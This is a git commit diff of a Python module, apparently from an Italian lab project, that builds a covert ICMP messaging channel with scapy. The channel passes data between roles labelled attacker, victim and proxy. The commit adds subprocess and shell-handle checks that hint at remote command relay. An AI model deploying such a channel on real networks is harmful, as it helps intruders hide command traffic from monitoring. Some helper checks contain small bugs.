0b822d34098b6526a71d001f437a910256fc93d4
Marco <61580913+mcrmrc@users.noreply.github.com.>
2025-06-30 10:12:52 +0200

    Modificato libreria comunicazione

--- implementazione/unione/comunication_methods.py
+++ implementazione/unione/comunication_methods.py
@@ -4,195 +4,300 @@ import threading
 import argparse
 import mymethods
 import time
-import re
+import re 
+import subprocess
 
-CONNECT="__CONNECT__"
 CONFIRM_ATTACKER="__CONFIRM_ATTACKER__"
 CONFIRM_VICTIM="__CONFIRM_VICTIM__"
-CONFIRM_PROXY="CONFIRM_PROXY"
-LAST_PACKET="__END__"
-READY="__READY__"
+CONFIRM_PROXY="__CONFIRM_PROXY__"
+CONFIRM_COMMAND="__CONFIRM_COMMAND__"
+LAST_PACKET="__LAST_PACKET__"
+START="__START__"
+END_COMMUNICATION="__END_COMMUNICATION__"
+END_DATA="__END_DATA__"
+
+exit_cases=["exit","quit",END_COMMUNICATION]
 
 ip_reg_pattern=r"^\d+\.\d+\.\d+\.\d+$"
 
-pkt_conn_received = threading.Event() 
-def wait_pkt_conn_received():
-    pkt_conn_received.wait() 
-    pkt_conn_received.clear()
-def set_pkt_conn_received():
-    pkt_conn_received.set()
+#------------------------
+def is_callback_function(callback_function=None):
+    #the type of a function can be 'function' or 'method'
+    if callback_function is None or not callable(callback_function):
+        raise Exception(f"is_callback_function: Callback function invalida {callback_function}") 
+    return True
 
-def send_packet(data:bytes=None,ip_dst=None, time=10,icmp_seq=999):
-    if type(ip_dst) is not str or re.match(ip_reg_pattern, ip_dst) is None :
-        raise Exception("IP non valido")
-    if data is None or type(data) is not bytes: 
-        print(data)
-        print(type(data))
-        raise Exception("I dati devono essere bytes")  
-    
-    icmp_id=mymethods.calc_checksum(data) 
+def is_valid_ipaddress(ip_address:str): 
+    if type(ip_address) is not str or re.match(ip_reg_pattern, ip_address) is None:
+        raise ValueError(f"is_valid_ipaddress: ip_address non è un indirizzo valido {ip_address}") 
+    return True
 
-    pkt = IP(dst=ip_dst)/ICMP(id=icmp_id,seq=icmp_seq) / data  
-    print(f"Sending...")
-    print(f"{pkt.summary()}") #print(f"{pkt.show()}")
-    ans = sr1(pkt, timeout=time, verbose=1)
-    if ans:
-        print(f"Reply: \t{ip_dst} is alive\n")
-        #ans.show()
-        return True 
-    print(f"No reply: \t{ip_dst} is not responding\n")
-    return False
+def is_valid_time(timeout_time=None):    
+    if timeout_time is None or not isinstance(timeout_time, (int, float)):
+        raise Exception(f"is_valid_time: Tempo non accettato {timeout_time}")  
+    return True
 
-def sniffer_timeout():
-    global sniffer
-    if not pkt_conn_received.is_set():
-        print("Timeout: No packet received within 60 seconds")
-        sniffer.stop() 
-        set_pkt_conn_received()
+def is_threading_Event(event:threading.Event=None):
+    if event is None or not isinstance(event, threading.Event):
+        raise Exception(f"is_threading_Event: event non è un threading.Event {event}")
+    return True 
 
-def nonusable_callback(packet):
-    global ip_attacker, proxy_ip, timeout_timer
-    print("comunication_callback")
-    print("Packet received: \n{}".format(packet.summary()))     
-    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
-        if CONNECT.encode() in packet[Raw].load:
-            print(f"{packet[IP].src} si vuole collegare") 
-            #proxy_ip.append(packet[IP].src) if packet[IP].src not in proxy_ip else None
-            #num_proxy = packet[Raw].load.replace(CONNECT,"")
-            print("Mittente: \t{}".format(packet[IP].src))
-            print("Payload: \t{}".format(bytes(packet[Raw].load)))  
-            set_pkt_conn_received()
+def is_dictionary(args:dict=None):
+    if args is None or not isinstance(args, dict):
+        raise Exception(f"is_dictionary: Argomenti non validi {args}") 
+    return True
 
-def sniff_packet(args:dict,timeout_time=60):
-    global sniffer, gateway,timeout_timer
+def is_AsyncSniffer(sniffer:AsyncSniffer=None):
+    if sniffer is None or not isinstance(sniffer,AsyncSniffer):
+        raise ValueError(f"is_AsyncSniffer: lo sniffer non è valido {sniffer}") 
+    return True 
 
+def is_threading_Timer(timer:threading.Timer=None):
+    if timer is None or not isinstance(timer, threading.Timer):
+        raise Exception(f"is_threading_Timer: timer non è un threading.Timer {timer}")
+    return True 
+
+def is_list(lista:list=None):
+    if list is None or not isinstance(lista,list):
+        raise Exception(f"is_list: lista non è una lista {lista}")
+    return True  
+
+def is_string(stringa:str=None):
+    if stringa is None or not isinstance(stringa,str):
+        raise Exception(f"is_string: stringa non valida {stringa}")
+    return True 
+
+def is_bytes(byte:bytes=None):
+    if byte is None or not isinstance(byte,bytes):
+        raise Exception(f"is_bytes: byte non valido {byte}")
+    return True 
+
+def is_boolean(booleano:bool=None):
+    if booleano is None or not isinstance(booleano,bool):
+        raise Exception(f"is_boolean: booleano non valido {booleano}")
+    return True 
+
+def is_threading_lock(block:threading.Lock=None):
+    if block is None or not isinstance(block,type(threading.Lock())):
+        raise Exception(f"is_threading_lock: lock non valido {block}")
+    return True 
+
+def is_valid_shell(shell:subprocess.Popen[str]=None):
+    if shell is None or not isinstance(shell, subprocess.Popen):
+        raise ValueError(f"is_valid_shell: shell non valida {shell}")
+    return True
+
+#------------------------
+def check_args_sniffer(args:dict=None): 
+    try:
+        is_dictionary(args)
+    except Exception as e:
+        raise Exception(f"check_args_sniffer: {e}")
     accepted_key_dict=[
         "iface","filter","prn","store","count", "timeout" ,"lfilter", 
         "opened_socket","session","started_callback","offline","quiet" 
-    ] 
-    if args is None or type(args) is not dict:
-        raise Exception("Argomenti non validi") 
-    if timeout_time is not None and type(int(timeout_time)) is not int: 
-        raise Exception("Tempo non accettato") 
-    timeout_time=int(timeout_time) if timeout_time is not None else timeout_time
+    ]  
     invalid_args=[key for key in args if key not in accepted_key_dict]
     if len(invalid_args):
-        raise ValueError(f"Invalid keys in dictionary {invalid_args}")
-    #if type(ip_host) is not str or re.match(ip_reg_pattern, ip_host) is None:
-        #raise Exception("IP non valido") 
-    #if type(gateway) is not str or re.match(ip_reg_pattern, gateway) is None:
-        #raise Exception("Sniffer non presente") 
-    sniffer= AsyncSniffer(
-        **args
-    ) 
-    timeout_timer = threading.Timer(timeout_time, sniffer_timeout)
+        raise ValueError(f"check_args_sniffer: Invalid keys in dictionary {invalid_args}")
+    return True
+
+def check_proxy_ipaddress(proxy_list:list):
+    wrong_ips=[]
+    for proxy in proxy_list:
+        try: 
+            #print(re.match(ip_reg_pattern, proxy))
+            if not is_valid_ipaddress(proxy): 
+                wrong_ips.append(proxy)
+        except Exception as e: 
+            print(f"check_proxy_ipaddress: {e}") 
+            wrong_ips.append(proxy)
+    return wrong_ips  
+
+#-------------------- 
+def get_threading_Event(): 
+    event = threading.Event()
+    try:
+        is_threading_Event(event)
+    except Exception as e:
+        raise Exception(f"get_threading_Event: {e}") 
+    return event
+
+def get_AsyncSniffer(args:dict=None):
+    try: 
+        check_args_sniffer(args)
+    except Exception as e:
+        print(f"get_AsyncSniffer: {e}")
+    return AsyncSniffer( **args )
+
+def get_timeout_timer(timeout_time=60, callback_function=None):
+    try:
+        is_callback_function(callback_function) 
+        if timeout_time is not None:
+            is_valid_time(timeout_time)
+    except Exception as e:
+        raise Exception(f"get_timeout_timer: {e}")
+    return threading.Timer(timeout_time, callback_function)
+
+def get_thread_response(proxy:str=None,thread_lock:threading.Lock=None,thread_response:dict=None,response:bool=True):
+    try:
+        is_valid_ipaddress(proxy)
+        is_threading_lock(thread_lock)
+        is_dictionary(thread_response)
+        is_boolean(response)
+    except Exception as e:
+        raise Exception(f"get_thread_response: {e}")
+    response=None
+    thread_lock.acquire()
+    response=thread_response.get(proxy)
+    thread_lock.release()
+    return response 
+
+def update_thread_response(proxy:str=None,thread_lock:threading.Lock=None,thread_response:dict=None,response:bool=False):
+    try:
+        if not is_valid_ipaddress(proxy):
+            raise Exception(f"update_thread_response: ipaddress {proxy}") 
+        if not is_threading_lock(thread_lock):
+            raise Exception(f"update_thread_response: lock {thread_lock}") 
+        if not is_dictionary(thread_response):
+            raise Exception(f"update_thread_response: dict {thread_response}") 
+        if not is_boolean(response):
+            raise Exception(f"update_thread_response: bollean {response}") 
+    except Exception as e:
+        raise Exception(f"update_thread_response: is_boolean {e}")
+    thread_lock.acquire()
+    thread_response.update({proxy:response}) 
+    thread_lock.release()
+
+#-------------------- 
+def wait_threading_Event(event:threading.Event=None):
+    try:
+        is_threading_Event(event)
+    except Exception as e:
+        raise Exception(f"wait_threading_Event: {e}") 
+    event.wait() 
+    event.clear()
+
+def set_threading_Event(event:threading.Event=None):
+    try:
+        is_threading_Event(event)
+    except Exception as e:
+        raise Exception(f"set_pkt_threading_Event: {e}") 
+    event.set()
+
+#------------------------
+def start_sniffer(sniffer:AsyncSniffer=None, timer:threading.Timer=None):
+    if sniffer is None or not isinstance(sniffer, AsyncSniffer):
+        raise Exception("start_sniffer: sniffer non valido")
+    if timer is None or not isinstance(timer, threading.Timer):
+        raise Exception("start_sniffer: timer non valido")
     sniffer.start()
-    timeout_timer.start() 
+    timer.start()
 
-def set_args_parser():
-    global parser
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--ip_host",type=str, help="IP dell'attaccante")
-    return mymethods.check_args(parser)
-
-def check_connessione(ip_dst,args=None):
-    global sniffer, timeout_timer
-    if type(ip_dst) is not str or re.match(ip_reg_pattern, ip_dst) is None:
-        raise Exception("IP non valido") 
-    if args is None or type(args) is not dict:
-        raise Exception("Argomenti non validi") 
-    
-    print(f"Controllo la connessione con {ip_dst}...")
-    sniff_packet(args) 
-    wait_pkt_conn_received()
-    if sniffer.running:
-        sniffer.stop()
-        sniffer.join()
-    if timeout_timer.is_alive():
-        timeout_timer.cancel()
-        data=CONNECT.encode()
-        if send_packet(data,ip_dst):
-            print(f"Stabilita connessione con {ip_dst}")
-            return True
-    print(f"Nessuna connessione con {ip_dst}")
+def stop_sinffer(sniffer=None):
+    try:
+        if not is_AsyncSniffer(sniffer):
+            raise Exception(f"stop_sinffer: sniffer non valido")
+    except Exception as e:
+        raise Exception(f"stop_sinffer: {e}")
+    if sniffer.running: 
+        sniffer.stop() 
+        print("Sniffer Stopped")
+        return True
     return False
 
-def test_connection(ip_dst,args:dict,data=None,timeout_time=60):
-    global sniffer, timeout_timer
-    if type(ip_dst) is not str or re.match(ip_reg_pattern, ip_dst) is None:
-        raise Exception("IP non valido") 
-    print(f"Tento la connessione con {ip_dst}...")
-    if type(data) is not str or data is None:
-        raise Exception("Dati non validi") 
-    #data="".join(f"{CONNECT} {ip_vittima}")
-    if send_packet(data,ip_dst): 
-        if args is None or type(args) is not dict:
-            raise Exception("Argomenti non validi")
-        sniff_packet(args) 
-        wait_pkt_conn_received()
+def sniffer_timeout(sniffer:AsyncSniffer=None,threading_event:threading.Event=None):
+    try:
+        is_AsyncSniffer(sniffer)
+        is_threading_Event(threading_event)
+    except Exception as e:
+        raise ValueError(f"sniffer_timeout: {e}")
+    if not threading_event.is_set():
+        print("Timeout: No packet received within 60 seconds")
         if sniffer.running:
-            sniffer.stop()
-            sniffer.join()
-            print(f"Connection with {ip_dst} has being succesfull")
-            return True
-    print(f"{ip_dst} is not responding")
+            sniffer.stop() 
+        set_threading_Event(threading_event) 
+
+def stop_timer(timer:threading.Timer=None):
+    try:
+        if not is_threading_Timer(timer):
+            raise Exception(f"stop_timer: timer non valido")
+    except Exception as e:
+        raise Exception(f"stop_timer: {e}")
+    if timer.is_alive():
+        timer.cancel() 
+        print("Timer Stopped")
+        return True
     return False
 
-if __name__=="__main__":
-    global ip_host, gateway, ip_proxy
 
-    ip_dst="192.168.56.101"
-    args_dict={
-        "filter":f"icmp and src {ip_dst}"
-        #,"count":1 
-        ,"prn":nonusable_callback 
-        #,"store":True 
-        ,"iface":mymethods.iface_from_IP(ip_dst)[1]
-    }
-    data=f"{CONNECT} 192.168.56.102"
-    test_connection(ip_dst,args_dict,data)
-    exit(0)
-    args=set_args_parser()
-    if args.ip_host is None :
-        print("Devi specificare l'IP dell'attaccante")
-        mymethods.supported_arguments(parser)
-        exit(0)
-    if type(args.ip_host) is not str or re.match(ip_reg_pattern, args.ip_host) is None:
-        raise Exception("IP host non valido")
-    
-    ip_host=args.ip_host
-    gateway=".".join(
-        ip_host.split(".")[index] if index!=3 else "0" 
-        for index in range(len(ip_host.split(".")))
-    )
-    print(f"IP della macchina: {ip_host}")
-    print(f"Gateway: {gateway}") 
 
-    args_sniff={
-        "filter": f"icmp and dst {ip_host}" 
-        #,"count":1 
-        ,"prn":nonusable_callback 
-        #,store:True 
-        ,"iface":mymethods.iface_from_IP(gateway)[1]  
-    }
-    sniff_packet(args_sniff)
-    wait_pkt_conn_received() 
-    if sniffer.running:
-        sniffer.stop()
-        sniffer.join() 
-    
-    ip_proxy = [
-        "192.168.56.101"
-        ,"192.168.56.103"
-        ,"192.168.56.1"
-        #,"192.168.56.xxx"
-    ]  
-    for proxy in ip_proxy: 
-        send_packet(data=CONNECT.encode(), ip_dst=proxy)
+#------------------------
+def send_packet(data:bytes=None,ip_dst=None, time=10,icmp_seq=0,id=None):
+    try:
+        is_valid_ipaddress(ip_dst)
+        if data is None or not isinstance(data,bytes): 
+            raise Exception("send_packet: I dati devono essere bytes")
+    except Exception as e:
+        raise Exception(f"send_packet: {e}") 
+    if id is None:
+        icmp_id=mymethods.calc_checksum(data) 
+    pkt = IP(dst=ip_dst)/ICMP(id=icmp_id,seq=icmp_seq) / data  
+    print(f"Sending {pkt.summary()}") 
+    ans = sr1(pkt, timeout=time, verbose=1)
+    if ans:
+        #print(f"Reply: \t{ip_dst} is alive\n") 
+        return True 
+    #print(f"No reply: \t{ip_dst} is not responding\n")
+    return False
 
-def check_proxy_ipaddress(proxy_ip:list):
-    not_corrected_ip=[]
-    for proxy in proxy_ip:
-        if re.match(ip_reg_pattern, proxy) is None:
-            not_corrected_ip.append(proxy)
-    return not_corrected_ip
+def sniff_packet_w_callbak(args:dict=None,timeout_time=60, callback_function=sniffer_timeout):
+    try:
+        check_args_sniffer(args) 
+        if timeout_time is not None:
+            is_valid_time(timeout_time)
+        is_callback_function(callback_function)
+    except Exception as e: 
+        raise Exception(f"sniff_packet_w_callbak: {e}")
+    timeout_time=int(timeout_time) if timeout_time is not None else timeout_time
+    sniffer= get_AsyncSniffer(args) 
+    timer = get_timeout_timer(timeout_time, callback_function) 
+    start_sniffer(sniffer, timer) 
+    return sniffer, timer 
+
+def sniff_packet(args:dict=None,timeout_time=60, event:threading.Event=None):
+    try:
+        check_args_sniffer(args) 
+        if timeout_time is not None:
+            is_valid_time(timeout_time)
+        is_threading_Event(event) 
+    except Exception as e: 
+        raise Exception(f"sniff_packet: {e}") 
+    sniffer= get_AsyncSniffer(args) 
+    callback_function=lambda: sniffer_timeout(sniffer, event)
+    timeout_time=int(timeout_time) if timeout_time is not None else timeout_time
+    timer = get_timeout_timer(timeout_time, callback_function) 
+    start_sniffer(sniffer, timer) 
+    return sniffer, timer 
+#------------------------
+def setup_thread_4_foreach_proxy(proxy_list:list=None,callback_function=None): 
+    try: 
+        is_callback_function(callback_function)
+        if not is_list(proxy_list) or len(proxy_list)<=0:
+            raise Exception(f"setup_thread_4_foreach_proxy: lista non vlaida")
+    except Exception as e:
+        raise Exception(f"setup_thread_4_foreach_proxy: {e}")
+    thread_lock=threading.Lock()
+    thread_proxy_response={}
+    thread_list={}
+    for proxy in proxy_list:
+        thread=threading.Thread(
+            target=callback_function
+            ,args=[proxy]
+        )
+        thread_list.update({proxy:thread})
+        thread_proxy_response.update({proxy:False}) 
+    print(f"Lock creato:\t{thread_lock}")
+    print(f"Thread creati:\t{thread_list}")
+    print(f"Risposte create:\t{thread_proxy_response}")
+    return thread_lock, thread_proxy_response, thread_list
